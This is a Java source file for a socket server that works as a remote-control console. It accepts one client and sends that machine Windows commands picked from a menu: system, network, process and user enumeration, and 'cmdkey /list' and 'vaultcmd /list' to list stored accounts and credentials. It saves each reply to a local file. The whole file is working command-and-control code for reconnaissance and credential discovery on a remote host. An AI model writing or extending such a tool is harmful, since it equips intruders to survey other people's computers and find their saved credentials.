/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

/**
 *
 * @author camilo
 */
public final class Server {

    private Socket socket = null;
    private ServerSocket server = null;
    private DataInputStream in = null;
    private DataInputStream input = null;
    private DataOutputStream out = null;
    private Integer port;

    /**
     * @param port
     */
    public Server(Integer port) {
        this.port = port;
        try {

            connectToClient();

            while (true) {
                try {
                    System.out.println("-----Options-----");
                    System.out.println("1. Obtain system information");
                    System.out.println("2. Obtain installed controllers");
                    System.out.println("3. Red information");
                    System.out.println("4. Show stored accounts");
                    System.out.println("5. Show active processes information");
                    System.out.println("6. Active users");
                    System.out.println("7. Show stored credentials");
                    System.out.println("8. Active services");
                    System.out.println("9. Active connections");
                    System.out.println("10. Show all users");

                    System.out.println("Enter the option");

                    String command = input.readLine();
                    try {
                        Integer option = Integer.parseInt(command);
                        switch (option) {
                            case 1:
                                execCommand("systeminfo");
                                break;
                            case 2:
                                execCommand("driverquery");
                                break;
                            case 3:
                                execCommand("ipconfig");
                                break;
                            case 4:
                                execCommand("cmdkey /list");
                                break;
                            case 5:
                                execCommand("qprocess");
                                break;
                            case 6:
                                execCommand("quser");
                                break;
                            case 7:
                                execCommand("vaultcmd /list");
                                break;
                            case 8:
                                execCommand("net start");
                                break; 
                            case 9:
                                execCommand("netstat");
                                break;
                            case 10:
                                execCommand("net user");
                                break;                                
                            default:
                                System.out.println("Invalid option");
                                break;
                        }
                    } catch (NumberFormatException ex) {
                        System.out.println("Invalid option");
                    }

                } catch (SocketException i) {
                    System.out.println(i);
                }
            }
        } catch (IOException i) {
            System.out.println("Connection error");
        }
    }

    public void execCommand(String command) throws IOException {

        out.writeUTF(command);

        String clientResponse = in.readUTF();

        PrintWriter writer = new PrintWriter("tmp.txt", "UTF-8");
        writer.println(clientResponse);
        writer.close();
    }

    public void connectToClient() throws IOException {
        server = new ServerSocket(port);

        System.out.println("Server started");
        System.out.println("Waiting for a client ...");

        socket = server.accept();
        System.out.println("Client accepted");

        // takes input from terminal
        input = new DataInputStream(System.in);

        // takes input from the client socket
        in = new DataInputStream(
                new BufferedInputStream(socket.getInputStream()));

        // sends output to the socket
        out = new DataOutputStream(socket.getOutputStream());
    }
}
